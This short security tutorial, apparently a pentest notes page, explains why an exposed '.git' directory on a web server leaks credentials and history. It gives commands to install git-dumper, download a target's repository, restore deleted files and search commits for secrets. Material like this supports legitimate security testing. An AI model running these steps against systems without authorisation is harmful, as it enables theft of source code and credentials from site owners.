# Overview
>[!INFO]
>Today many applications use GIT to version and/or publish application code. 
>The risk arises when the “.git” directory is inadvertently exposed by the application. This can happen if an application using Git for version control accidentally leaves the directory accessible to the public. The “.git” directory often contains sensitive information, such as API keys, developer comments, AWS credentials, and even administrative passwords. Additionally, it stores a complete log of all changes made during development, which could provide attackers with valuable insights into the system’s structure and vulnerabilities.

# Exploit
- Install `git-dumper` : 
```bash
# with pip
pip install git-dumper

# from source
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
pip install -r requirements.txt
```

### Example Workflow
1. Identify a target with an exposed `.git` directory.
2. Download the Git repository from :
```bash
git-dumper http://IP/.git repo
# or 
wget -r --no-parent https://IP/.git/
```
3. Navigate to the downloaded repository directory:
```bash
cd repo
```
4. Inspect the repository for sensitive information or potential vulnerabilities.
```bash
git status
# Some files have been deleted ? If so :

git checkout -- . 
# or
git restore .

# Read logs
git log

# Read commits - Sensitive informations ?
git show <commit-id>
```